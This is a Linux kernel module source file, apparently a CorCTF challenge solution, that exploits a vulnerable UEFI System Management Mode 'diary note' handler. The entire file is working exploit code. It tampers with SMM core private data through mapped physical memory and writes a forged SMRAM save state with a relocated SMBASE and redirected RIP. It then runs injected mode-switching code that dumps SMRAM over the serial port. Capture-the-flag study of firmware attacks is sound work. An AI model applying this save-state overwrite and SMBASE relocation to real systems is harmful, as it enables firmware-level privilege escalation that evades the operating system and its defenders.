#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/efi.h>
#include <asm/tlbflush.h>
#include <asm/io.h>

typedef u64 UINT64;
typedef u32 UINT32;
typedef u16 UINT16;
typedef u8 UINT8;
typedef unsigned long UINTN;

typedef void VOID;
typedef void *EFI_HANDLE;
typedef bool BOOLEAN;
typedef efi_status_t EFI_STATUS;
typedef UINTN EFI_PHYSICAL_ADDRESS;

typedef struct {
	UINTN                   Signature;
	EFI_HANDLE              SmmIplImageHandle;
	UINTN                   SmramRangeCount;
	void *SmramRanges;
	void *SmmEntryPoint;
	BOOLEAN                  SmmEntryPointRegistered;
	BOOLEAN                  InSmm;
	void *Smst;
	VOID                     *CommunicationBuffer;
	UINTN                    BufferSize;
	EFI_STATUS               ReturnStatus;
	EFI_PHYSICAL_ADDRESS     PiSmmCoreImageBase;
	UINT64                   PiSmmCoreImageSize;
	EFI_PHYSICAL_ADDRESS     PiSmmCoreEntryPoint;
} SMM_CORE_PRIVATE_DATA;

typedef struct {
	UINT32 Data1;
	UINT16 Data2;
	UINT16 Data3;
	UINT8 Data4[8];
} EFI_GUID;
typedef struct {
	EFI_GUID    HeaderGuid;
	UINTN       MessageLength;
	// UINT8       Data[1];
} EFI_SMM_COMMUNICATE_HEADER;

typedef struct {
	UINT8 Note[16];
} DIARY_NOTE;

#define ADD_NOTE 0x1337
#define GET_NOTE 0x1338
#define DUMP_NOTES 0x31337

typedef struct {
    UINT32 Cmd;
    UINT32 Idx;
    union TRANSFER_DATA
    {
        DIARY_NOTE Note;
        UINT8 *Dest;
    } Data;
} COMM_DATA;

struct scratch_page_layout {
	EFI_SMM_COMMUNICATE_HEADER header;
	COMM_DATA data;
};

/*
0x7ffbeea0:	0x0000000000000000	0x0000000000000000
0x7ffbeeb0:	0x0000000000000000	0x0000000000000000
0x7ffbeec0:	0x0000000000000000	0x0000000000000000
0x7ffbeed0:	0x0000000000000d01	0x0000000000000000
0x7ffbeee0:	0x0000000000000000	0x0000000000000000
0x7ffbeef0:	0x0000000000000000	0x0002006400000000
0x7ffbef00:	0x000000007ffaf000	0x0000000000000000
0x7ffbef10:	0x0000000000000000	0x0000000000000000
0x7ffbef20:	0x0000000000000000	0x0000000000000000
0x7ffbef30:	0x0000000000000000	0x0000000000000000
0x7ffbef40:	0x0000000000000000	0x0000000000751ef0
0x7ffbef50:	0x0000000101b60000	0x0000000080050033
0x7ffbef60:	0x0000000000000400	0x00000000ffff0ff0
0x7ffbef70:	0x0000000000000246	0xffffffffc0340081
0x7ffbef80:	0xffffffffc033d000	0x0000000000000000
0x7ffbef90:	0xff3f4d270196c860	0xff524c3340650000
0x7ffbefa0:	0xff524c334061fb9c	0xff3f4d27001c8668
0x7ffbefb0:	0x000000000000003f	0x0000000000000000
0x7ffbefc0:	0x0000000000000000	0x0000000000010000
0x7ffbefd0:	0xff524c334061fc78	0xff524c334061fc68
*/

union book {
	struct savestate {
		UINT64    IO_RIP;          // 7ea0h
		UINT64    IO_RCX;          // 7ea8h
		UINT64    IO_RSI;          // 7eb0h
		UINT64    IO_RDI;          // 7eb8h
		UINT32    IO_DWord;        // 7ec0h
		UINT8     Reserved1[0x04]; // 7ec4h
		UINT8     IORestart;       // 7ec8h
		UINT8     AutoHALTRestart; // 7ec9h
		UINT8     Reserved2[0x06]; // 7ecah

		UINT64    IA32_EFER;       // 7ed0h
		UINT64    SVM_Guest;       // 7ed8h
		UINT64    SVM_GuestVMCB;   // 7ee0h
		UINT64    SVM_GuestVIntr;  // 7ee8h
		UINT8     Reserved3[0x0c]; // 7ef0h

		UINT32    SMMRevId;        // 7efch
		UINT32    SMBASE;          // 7f00h

		UINT8     Reserved4[0x1c];   // 7f04h
		UINT64    SVM_GuestPAT;      // 7f20h
		UINT64    SVM_HostIA32_EFER; // 7f28h
		UINT64    SVM_HostCR4;       // 7f30h
		UINT64    SVM_HostCR3;       // 7f38h
		UINT64    SVM_HostCR0;       // 7f40h

		UINT64    _CR4;            // 7f48h
		UINT64    _CR3;            // 7f50h
		UINT64    _CR0;            // 7f58h
		UINT64    _DR7;            // 7f60h
		UINT64    _DR6;            // 7f68h
		UINT64    _RFLAGS;         // 7f70h
		UINT64    _RIP;            // 7f78h
		UINT64    _R15;            // 7f80h
		UINT64    _R14;            // 7f88h
		UINT64    _R13;            // 7f90h
		UINT64    _R12;            // 7f98h
		UINT64    _R11;            // 7fa0h
		UINT64    _R10;            // 7fa8h
		UINT64    _R9;             // 7fb0h
		UINT64    _R8;             // 7fb8h
		UINT64    _RDI;            // 7fc0h
		UINT64    _RSI;            // 7fc8h
		UINT64    _RBP;            // 7fd0h
		UINT64    _RSP;            // 7fd8h
	} savestate;
	DIARY_NOTE Book[20];
} book;

static void __attribute__((__noinline__,__noclone__)) smi(void)
{
	__asm__ __volatile__(
		"xor %%eax,%%eax\n"
		"outb %%al,$0xB3\n"
		"outb %%al,$0xB2\n"
		"jmp 1f\n"
		"1:\n"
		::: "rax","memory"
	);
}

static void __attribute__((__noinline__,__noclone__)) smitwice(void)
{
	__asm__ __volatile__(
		"xor %%eax,%%eax\n"
		"outb %%al,$0xB3\n"
		"outb %%al,$0xB2\n"
		"jmp fin_smi\n"
		".globl fin_smi\n"
		"fin_smi:\n"
		"xor %%eax,%%eax\n"
		"outb %%al,$0xB3\n"
		"outb %%al,$0xB2\n"
		"jmp 1f\n"
		"1:\n"
		::: "rax","memory"
	);
}

static int __init invoke(void (*smifunc)(void), COMM_DATA *data)
{
	unsigned long scratch_page_phys = 0x7E8EF000;
	struct scratch_page_layout *scratch_page_virt = ioremap(scratch_page_phys, 0x1000);

	unsigned long PiSmmIpl = 0x0007EAC8000;
	void *PiSmmIpl_Virt = ioremap(PiSmmIpl, 0x10000);
	unsigned long mSmmCorePrivateDataOffset = 0x7380;

	SMM_CORE_PRIVATE_DATA *gSmmCorePrivate = PiSmmIpl_Virt + mSmmCorePrivateDataOffset;

	scratch_page_virt->header.HeaderGuid = (EFI_GUID)
		{0xb888a84d, 0x3888, 0x480e, { 0x95, 0x83, 0x81, 0x37, 0x25, 0xfd, 0x39, 0x8b } };
	scratch_page_virt->header.MessageLength = sizeof(COMM_DATA);
	scratch_page_virt->data = *data;

	gSmmCorePrivate->CommunicationBuffer = (void *)scratch_page_phys;
	gSmmCorePrivate->BufferSize = sizeof(EFI_SMM_COMMUNICATE_HEADER) + scratch_page_virt->header.MessageLength;

	mb();
	smifunc();

	iounmap(scratch_page_virt);
	iounmap(PiSmmIpl_Virt);

	return 0;
}

__asm__ (
	"begin_new_smi:\n"
	".code16\n"
	"mov $0x8018,%bx\n"
	"data32 lgdt %cs:(%bx)\n"
	"mov %cr0,%eax\n"
	"or $1,%al\n"
	"mov %eax,%cr0\n"
	"data32 ljmp $0x10,$0xDEADBEEF\n"
	"gdt_desc:\n"
	".word gdt_bottom - gdt - 1\n"
	"ptr_gdt:"
 	".long 0\n"
	"gdt:\n"
	".quad 0\n"
	".quad 0\n"
	".quad 0x00CF9A000000FFFF\n"
	".quad 0x00CF92000000FFFF\n"
	"gdt_bottom:\n"
	"protected_mode:\n"
	".code32\n"
	"mov $0x18,%cx\n"
	"mov %cx,%ds\n"
	"mov %cx,%es\n"
	"mov %cx,%fs\n"
	"mov %cx,%gs\n"
	"mov %cx,%ss\n"
	"mov $(0x0007FF9C000+0x2bac),%esi\n"
	"mov $0x3f8,%dx\n"
	"print_loop:\n"
	"lodsb\n"
	"outb %al,(%dx)\n"
	"jmp print_loop\n"
	".code64\n"
);

static int __init test_init(void)
{
	extern char fin_smi[];
	extern char begin_new_smi[], ptr_gdt[], gdt[], gdt_desc[], protected_mode[];

	u64 reg;
	int i;

	void *newsmbase = (void *)__get_free_pages(GFP_KERNEL | __GFP_DMA, 6);
	__builtin_memcpy(newsmbase+0x8000, &begin_new_smi, 0x1000);

	book.savestate.IA32_EFER = 0x0000000000000d01;
	book.savestate.SMMRevId = 0x00020064;
	book.savestate.SMBASE = virt_to_phys(newsmbase);

	*(u32 *)(newsmbase+0x8000+(uintptr_t)&ptr_gdt-(uintptr_t)&begin_new_smi) =
		book.savestate.SMBASE+0x8000+(uintptr_t)&gdt-(uintptr_t)&begin_new_smi;
	*(u32 *)(newsmbase+0x8000+(uintptr_t)&gdt_desc-(uintptr_t)&begin_new_smi-6) =
		book.savestate.SMBASE+0x8000+(uintptr_t)&protected_mode-(uintptr_t)&begin_new_smi;

	pr_alert("newsmbase = %px. phys = %x\n", newsmbase, book.savestate.SMBASE);

	__asm__ __volatile__ (
		"mov %%cr4, %%rax\n"
		"mov %%rax, %0\n"
		: "=m" (reg) :: "rax"
	);
	book.savestate._CR4 = reg;

	__asm__ __volatile__ (
		"mov %%cr3, %%rax\n"
		"mov %%rax, %0\n"
		: "=m" (reg) :: "rax"
	);
	book.savestate._CR3 = reg;

	__asm__ __volatile__ (
		"mov %%cr0, %%rax\n"
		"mov %%rax, %0\n"
		: "=m" (reg) :: "rax"
	);
	book.savestate._CR0 = reg;

	__asm__ __volatile__ (
		"mov %%dr7, %%rax\n"
		"mov %%rax, %0\n"
		: "=m" (reg) :: "rax"
	);
	book.savestate._DR7 = reg;

	__asm__ __volatile__ (
		"pushf\n"
		"pop %%rax\n"
		"mov %%rax, %0\n"
		: "=m" (reg) :: "rax"
	);
	book.savestate._RFLAGS = reg;

	book.savestate._RIP = (uintptr_t)&fin_smi;

	for (i = 0; i < 20; i++) {
		invoke(smi, &(COMM_DATA){
			.Cmd = ADD_NOTE,
			.Idx = i,
			.Data.Note = book.Book[i],
		});
	}

	// {volatile int c = 0; while (!c);}

	invoke(smitwice, &(COMM_DATA){
		.Cmd = DUMP_NOTES,
		.Idx = i,
		.Data.Dest = (void *)0x7ffbeea0,
	});
	return 0;
}

module_init(test_init);

MODULE_AUTHOR("YiFei Zhu");
MODULE_DESCRIPTION("CorCTF Test");
MODULE_LICENSE("GPL");
MODULE_VERSION("0.1");
